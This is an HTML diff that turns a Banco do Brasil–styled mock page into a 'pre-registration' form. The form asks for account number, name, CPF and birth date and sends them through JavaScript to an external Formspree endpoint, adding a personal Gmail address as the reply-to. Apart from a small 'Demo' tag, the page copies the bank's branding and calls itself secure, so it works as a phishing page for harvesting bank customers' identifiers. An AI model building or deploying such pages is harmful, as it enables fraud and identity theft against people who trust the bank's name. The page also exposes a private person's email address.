@@ -3,223 +3,145 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Conta BB — Mock Hero</title>
+  <title>Conta BB — Pré-cadastro</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
   <style>
-    :root{
-      --bb-yellow: #ffe600;
-      --bb-blue: #001fa8;
-      --bb-blue-2: #0e2bd8;
-      --bg-dark: #0d0f14;
-      --text: #0a0f1a;
-      --muted: #2a3447;
-      --white: #ffffff;
-    }
-    *{box-sizing:border-box}
-    body{
-      margin:0;
-      font-family:"Inter",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
-      color:#0b1220;
-      background:#0b0f18;
-    }
-    /* Top bar */
-    .topbar{
-      background:var(--bb-yellow);
-      color:#111;
-      position:sticky; top:0; z-index:50;
-      border-bottom:1px solid rgba(0,0,0,.08);
-    }
-    .container{
-      max-width:1200px;
-      margin:0 auto;
-      padding:0 20px;
-    }
-    .topbar .row{
-      display:flex; align-items:center; gap:18px;
-      padding:10px 0;
-      flex-wrap:wrap;
-    }
-    .logo{
-      display:flex; align-items:center; gap:10px; font-weight:800;
-      letter-spacing:.2px;
-    }
-    .logo .mark{
-      width:28px; height:28px; background:#001fa8; border-radius:6px;
-      position:relative; overflow:hidden;
-    }
-    .logo .mark:before,.logo .mark:after{
-      content:""; position:absolute; background:#ffe600; border-radius:2px;
-    }
-    .logo .mark:before{ width:16px; height:4px; left:6px; top:8px; transform:rotate(30deg);}
-    .logo .mark:after { width:16px; height:4px; left:6px; top:16px; transform:rotate(-30deg);}
-    nav{
-      display:flex; gap:18px; flex-wrap:wrap; font-weight:600;
-    }
-    nav a{ color:#111; text-decoration:none; padding:6px 8px; border-radius:8px;}
-    nav a:hover{ background:rgba(0,0,0,.06); }
-    .search{
-      margin-left:auto; display:flex; align-items:center; gap:10px; flex:1; max-width:520px;
-    }
-    .search input{
-      width:100%; padding:10px 12px; border:1px solid rgba(0,0,0,.15);
-      border-radius:10px; outline:none;
-    }
-    .login{
-      background:#111; color:#fff; border:none; cursor:pointer; padding:10px 14px; border-radius:10px; font-weight:700;
-    }
-    /* Breadcrumb */
-    .breadcrumb{
-      background:var(--bb-blue); color:#dbe4ff;
-    }
-    .breadcrumb .container{ padding:10px 20px; }
-    .breadcrumb a{ color:#b9c6ff; text-decoration:none; }
-    /* Hero */
-    .hero{
-      position:relative;
-      background:
-        radial-gradient(1200px 600px at 100% 10%, rgba(0,31,168,.25), transparent 60%),
-        linear-gradient(180deg,#0a0f1a,#0a0f1a 30%, #0b1220 100%);
-      color:#eef2ff;
-      padding:50px 0 80px;
-      overflow:hidden;
-    }
-    .hero-inner{
-      display:grid; grid-template-columns: 1.2fr 1fr; gap:32px; align-items:center;
-    }
-    @media (max-width: 900px){
-      .hero-inner{ grid-template-columns:1fr; }
-    }
-    .copy h1{
-      font-size: clamp(28px, 5vw, 56px);
-      line-height:1.05; margin:0 0 12px; color:#ffe600;
-      text-shadow: 0 8px 22px rgba(0,0,0,.35);
-    }
-    .copy p{
-      margin:0 0 22px; color:#cdd7ff; font-size: clamp(15px, 2.1vw, 18px);
-      max-width: 560px;
-    }
-    .qr-card{
-      display:flex; gap:14px; align-items:center;
-      background:rgba(255,255,255,.06); border:1px solid rgba(255,255,255,.18);
-      border-radius:14px; padding:14px; width:max-content;
-      box-shadow: 0 10px 30px rgba(0,0,0,.25);
-    }
-    .qr{
-      width:96px; height:96px; background:#fff; border-radius:8px; position:relative;
-      display:grid; place-items:center; overflow:hidden;
-    }
-    /* tiny QR pattern */
-    .qr:before, .qr:after{
-      content:""; position:absolute; inset:8px; background:
-        conic-gradient(from 0deg at 25% 25%, #000 0 25%, transparent 0 100%),
-        conic-gradient(from 0deg at 75% 25%, #000 0 25%, transparent 0 100%),
-        conic-gradient(from 0deg at 25% 75%, #000 0 25%, transparent 0 100%),
-        conic-gradient(from 0deg at 75% 75%, #000 0 25%, transparent 0 100%);
-      background-size: 16px 16px;
-      background-repeat: repeat;
-      opacity:.9;
-    }
-    .qr-card small{ color:#d8e0ff; }
-    /* Decorative chevrons */
-    .shape{
-      position:absolute; opacity:.9; filter: drop-shadow(0 24px 40px rgba(0,0,0,.45));
-    }
-    .shape.chev{ width: 260px; height: 260px; border: 22px solid transparent; border-radius: 20px;
-      transform: rotate(45deg);
-    }
-    .shape.c1{ right: -30px; bottom: -40px; border-color:#00d4ff; }
-    .shape.c2{ right: 160px; bottom: 40px; border-color:#ffe600; }
-    .shape.c3{ right: 340px; bottom: -10px; border-color:#00b2ff; }
-    .shape.c4{ right: 520px; bottom: 60px; border-color:#7affc6; }
-    /* Cookie banner */
-    .cookies{
-      position:fixed; left:0; right:0; bottom:0;
-      background: rgba(13,17,26,.9); color:#e6edff; border-top:1px solid rgba(255,255,255,.1);
-      padding:14px 0; z-index:60;
-    }
-    .cookies .row{ display:flex; gap:18px; align-items:center; flex-wrap:wrap;}
-    .cookies p{ margin:0; color:#b9c6ff; }
-    .btn{ border:none; padding:10px 14px; border-radius:10px; cursor:pointer; font-weight:700; }
-    .btn-outline{ background:transparent; color:#e6edff; border:1px solid rgba(255,255,255,.25); }
-    .btn-yellow{ background:var(--bb-yellow); color:#0a0f1a; }
-    /* card glass effect for right side (photo placeholder) */
-    .photo{
-      position:relative; border-radius:22px; min-height:320px;
-      background:
-        radial-gradient(800px 300px at 10% -10%, rgba(255,230,0,.20), transparent 60%),
-        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="800"><defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop stop-color="%230a0f1a"/><stop offset="1" stop-color="%23101625"/></linearGradient></defs><rect width="100%" height="100%" fill="url(%23g)"/></svg>') center/cover no-repeat;
-      border:1px solid rgba(255,255,255,.12);
-      overflow:hidden;
-    }
-    .photo::after{
-      content:""; position:absolute; inset:0;
-      background: radial-gradient(400px 200px at 80% 20%, rgba(0,178,255,.25), transparent 60%);
-      mix-blend-mode: screen;
-    }
+    :root{ --bb-yellow:#ffe600; --bb-blue:#001fa8; --bg:#0b0f18; --glass:rgba(255,255,255,.06); }
+    *{box-sizing:border-box} body{margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:#eef2ff}
+    .topbar{background:var(--bb-yellow);color:#111} .container{max-width:960px;margin:0 auto;padding:0 20px}
+    .row{display:flex;gap:16px;align-items:center;flex-wrap:wrap;padding:10px 0}
+    .logo{display:flex;align-items:center;gap:10px;font-weight:800;color:#0a0f1a}
+    .breadcrumb{background:#001fa8} .breadcrumb .container{padding:10px 20px}
+    .hero{padding:36px 0 10px;background:radial-gradient(1200px 600px at 100% 10%, rgba(0,31,168,.25), transparent 60%)}
+    h1{color:var(--bb-yellow);font-size:clamp(28px,5vw,48px);margin:0 0 6px}
+    p.lead{color:#cdd7ff;margin:0 0 18px}
+    .form-card{background:rgba(10,15,26,.6);border:1px solid rgba(255,255,255,.14);border-radius:18px;padding:18px;box-shadow:0 18px 40px rgba(0,0,0,.35)}
+    form{display:grid;grid-template-columns:1fr 1fr;gap:14px} @media(max-width:720px){form{grid-template-columns:1fr}}
+    label{font-weight:600}
+    input{padding:12px;border-radius:12px;border:1px solid rgba(255,255,255,.18);background:var(--glass);color:#eef2ff}
+    .full{grid-column:1/-1}
+    .actions{grid-column:1/-1;display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+    .btn{border:none;padding:12px 16px;border-radius:12px;cursor:pointer;font-weight:800}
+    .btn-primary{background:var(--bb-yellow);color:#0a0f1a}
+    .btn-outline{background:transparent;color:#e6edff;border:1px solid rgba(255,255,255,.25)}
+    small.note{color:#b9c6ff}
+    .ok{color:#8cffb0} .err{color:#ffb4b4}
+    a{color:#9dd1ff}
+    .footer{opacity:.8;font-size:12px;margin:14px 0 24px}
   </style>
 </head>
 <body>
-  <!-- Topbar -->
   <header class="topbar">
     <div class="container">
       <div class="row">
-        <div class="logo">
-          <div class="mark" aria-hidden="true"></div>
-          <span>Banco do Brasil</span>
-        </div>
-        <nav aria-label="principal">
-          <a href="#">Pra Você</a>
-          <a href="#">Pro Seu Negócio</a>
-          <a href="#">Agronegócios</a>
-          <a href="#">Setor Público</a>
-        </nav>
-        <div class="search">
-          <input type="search" placeholder="O que você precisa?">
-          <button class="login">ACESSE SUA CONTA ▾</button>
-        </div>
+        <div class="logo"><span>Banco do Brasil — Demo</span></div>
       </div>
     </div>
   </header>
-
-  <!-- Breadcrumb -->
   <div class="breadcrumb">
     <div class="container"><small>Pra você / Contas</small></div>
   </div>
 
-  <!-- Hero -->
   <section class="hero">
-    <div class="container hero-inner">
-      <div class="copy">
-        <h1>Conta BB</h1>
-        <p>Encontre a conta BB ideal com soluções personalizadas para a sua gestão financeira.</p>
-
-        <div class="qr-card" aria-label="card de QR code para baixar o App BB">
-          <div class="qr" role="img" aria-label="QR code ilustrativo"></div>
-          <small>Aponte a câmera do seu celular para o código ao lado para baixar o App BB.</small>
-        </div>
-      </div>
-
-      <div class="photo" aria-hidden="true"></div>
+    <div class="container">
+      <h1>Conta BB</h1>
+      <p class="lead">Pré‑cadastro seguro e rápido. Preencha seus dados abaixo.</p>
     </div>
-
-    <!-- Decorative shapes -->
-    <div class="shape chev c1"></div>
-    <div class="shape chev c2"></div>
-    <div class="shape chev c3"></div>
-    <div class="shape chev c4"></div>
   </section>
 
-  <!-- Cookies -->
-  <div class="cookies" role="dialog" aria-live="polite">
+  <section>
     <div class="container">
-      <div class="row">
-        <p>Usamos cookies para segurança, melhor experiência e personalização de conteúdo. Consulte nossa <a href="#" style="color:#9dd1ff;">Política de Privacidade</a>.</p>
-        <div style="margin-left:auto; display:flex; gap:10px;">
-          <button class="btn btn-outline">CONFIGURAR COOKIES</button>
-          <button class="btn btn-yellow">PERMITIR TODOS</button>
+      <div class="form-card">
+        <form id="form">
+          <div class="field">
+            <label for="conta">Número da Conta</label>
+            <input id="conta" name="conta" type="text" inputmode="numeric" placeholder="Ex.: 12345-6" minlength="5" maxlength="12" required>
+          </div>
+          <div class="field">
+            <label for="nome">Nome</label>
+            <input id="nome" name="nome" type="text" placeholder="Seu nome completo" autocomplete="name" required>
+          </div>
+          <div class="field">
+            <label for="cpf">CPF</label>
+            <input id="cpf" name="cpf" type="text" inputmode="numeric" placeholder="000.000.000-00" required>
+          </div>
+          <div class="field">
+            <label for="nasc">Data Nasc.</label>
+            <input id="nasc" name="nasc" type="date" required>
+          </div>
+
+          <div class="full">
+            <small class="note">Ao enviar, você concorda com a Política de Privacidade.</small>
+          </div>
+
+          <div class="actions">
+            <button class="btn btn-primary" id="sendBtn">Enviar</button>
+            <button class="btn btn-outline" id="clearBtn" type="button">Limpar</button>
+            <span id="status"></span>
+          </div>
+        </form>
+        <div class="footer">
+          Hospedagem estática (GitHub Pages). O envio é feito por um serviço externo de formulários (ex.: Formspree).
         </div>
       </div>
     </div>
-  </div>
+  </section>
+
+  <script>
+    // CONFIGURE AQUI: endpoint Formspree (ou seu endpoint serverless)
+    // 1) Crie um formulário em https://formspree.io/ e substitua abaixo.
+    // 2) Ou use seu endpoint (Cloudflare Worker/Vercel/etc.)
+    const ENDPOINT = "https://formspree.io/f/SEU_ID_AQUI";
+
+    const form = document.getElementById('form');
+    const statusEl = document.getElementById('status');
+    const sendBtn = document.getElementById('sendBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const cpf = document.getElementById('cpf');
+    const conta = document.getElementById('conta');
+
+    // máscara leve para CPF
+    cpf.addEventListener('input', () => {
+      let v = cpf.value.replace(/\\D/g,'');
+      if (v.length > 11) v = v.slice(0,11);
+      let out = v;
+      if (v.length > 9) out = v.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{0,2})/,'$1.$2.$3-$4');
+      else if (v.length > 6) out = v.replace(/(\\d{3})(\\d{3})(\\d{0,3})/,'$1.$2.$3');
+      else if (v.length > 3) out = v.replace(/(\\d{3})(\\d{0,3})/,'$1.$2');
+      cpf.value = out;
+    });
+    conta.addEventListener('input', () => {
+      let v = conta.value.replace(/[^\\d-]/g,'');
+      conta.value = v.slice(0,12);
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      sendBtn.disabled = true; sendBtn.textContent = 'Enviando…';
+      statusEl.textContent = '';
+
+      const data = new FormData(form);
+      // adiciona o destinatário (opcional, pode ser fixo no painel Formspree)
+      data.append("_replyto", "anabealves98@gmail.com");
+      data.append("_subject", "Pré-cadastro — Conta BB");
+
+      try{
+        const r = await fetch(ENDPOINT, { method: "POST", body: data, headers: { "Accept": "application/json" }});
+        if (r.ok){
+          statusEl.innerHTML = '<span class="ok">✔️ Enviado com sucesso.</span>';
+          form.reset();
+        } else {
+          const t = await r.text();
+          statusEl.innerHTML = '<span class="err">Falha no envio: ' + t.substring(0,200) + '</span>';
+        }
+      }catch(err){
+        statusEl.innerHTML = '<span class="err">Erro de rede: ' + (err.message||err) + '</span>';
+      }finally{
+        sendBtn.disabled = false; sendBtn.textContent = 'Enviar';
+      }
+    });
+
+    clearBtn.addEventListener('click', ()=>{ form.reset(); statusEl.textContent = '' });
+  </script>
 </body>
 </html>
